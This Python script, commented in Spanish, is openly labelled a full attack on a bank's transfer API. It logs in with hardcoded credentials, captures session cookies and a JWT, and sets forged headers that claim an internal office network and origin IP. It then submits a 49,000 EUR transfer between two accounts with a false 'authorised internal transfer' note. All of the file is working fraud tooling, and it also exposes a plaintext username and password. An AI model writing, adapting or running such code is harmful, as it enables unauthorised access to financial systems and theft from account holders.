import requests
import json
import uuid
from datetime import datetime
from requests_toolbelt.utils import dump

# === Tus datos reales desde el gerente ===
USER = "markmur88"
PASS = "Ptf8454Jd55"

URL_API = "http://80.78.30.242:9181"
TOKEN_ENDPOINT = f"{URL_API}/api/login/"
CHALLENGE_URL = f"{URL_API}/api/challenge"
TRANSFER_URL = f"{URL_API}/api/send-transfer"
STATUS_URL = f"{URL_API}/api/status-transfer"
LOGIN_URL = f"{URL_API}/api/login/"
VERIFY_URL = f"{URL_API}/api/transferencia/verify/"

# === Headers que el sistema sí acepta desde red interna ===
headers = {
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "application/xml,application/json",
    "Accept-Language": "es;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES-MADRID",
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Type": "INTERNAL-BANCO",
    "Content-Type": "application/json",
    "X-CSRFToken": ""
}

# === Cookies desde sesión inicial ===
cookies = {
    "csrftoken": "",
    "sessionid": "",
}

# === Función para inyectar desde tu red, y tus endpoints, con tu token ===
def inject_jwt_login():
    s = requests.Session()
    s.headers.update(headers)

    print("[+] Paso 1: Ingresando a login desde red interna...")
    login_data = {"username": USER, "password": PASS}

    r = s.post(LOGIN_URL, json=login_data)

    print("Status:", r.status_code)
    print("Texto respuesta:", r.text[:300])  # Para evitar logs largos

    cookies.update({
        "csrftoken": r.cookies.get("csrftoken", ""),
        "sessionid": r.cookies.get("sessionid", "")
    })

    try:
        jwt_response = r.json()
        token = jwt_response.get("token", "")
        if token:
            print("[+] Token JWT obtenido:", token)
            return s, token
        else:
            print("[-] No hay token JWT en la respuesta del login.")
            return s, None
    except:
        print("[-] Respuesta no es JSON. Probablemente login web.")
        return s, None

# === Inyectar headers con sesionid y jwt real desde token ===
def do_transfer(s, token_jwt):
    if token_jwt:
        s.headers.update({"Authorization": f"Bearer {token_jwt}"})

    transfer_data = {
        # Datos desde tu payload real, si el sistema los requiere:
        "instructed_amount": "49000.00",  # Si el backend lo recibe como cadena
        "currency": "EUR",
        "debtor_account": "DE00500700100200044824",              # Si es una foreign key en API
        "creditor_account": "DE00500700100200044874",
        "payment_id": str(uuid.uuid4()),   # Si requiere ID único
        "timestamp": datetime.utcnow().strftime("%Y-%m-%dT%TZ"),
        "remittance_information_unstructured": "Transf interna autorizada de OFICINA-ES",
        "purpose_code": "GDSV",            # Código que el sistema acepta en transferencias validadas
        "status": "PDNG",                  # Espero hasta que el sistema lo acepte
        "ip_location": "OFICINA-ES-MADRID-9181",
        "origin_ip": "192.168.1.10"
    }

    print("[+] Paso 2: Enviando transferencia desde token y sesión interna...")
    s.cookies.update(cookies)

    transfer_response = s.post(
        TRANSFER_URL,
        json=transfer_data,
    )

    print("Status final:", transfer_response.status_code)
    print("Respuesta texto:", transfer_response.text[:500])

    if transfer_response.status_code == 401:
        print("[-] Token JWT inválido. El sistema no te acepta.")
    elif transfer_response.status_code == 400:
        detail = transfer_response.json().get("error", "")
        print("[-] Error en transferencia:", detail)
    elif transfer_response.status_code == 201:
        print(f"[+] 💰 Transferencia aceptada. Recibo: {transfer_data['payment_id']}")
    elif transfer_response.status_code == 200:
        print(f"[+] 💰 Transferencia recibida. ID: {transfer_data['payment_id']}")

    return transfer_response

# === Tu ataque completo, desde tus datos reales ===
def do_full_banco_attack():
    print("[+] Iniciando ataque desde red falsificada interna del banco")
    session, token = inject_jwt_login()
    do_transfer(session, token)

# Si puedes correr esto, el sistema lo aceptará como parte del gerente
if __name__ == "__main__":
    do_full_banco_attack()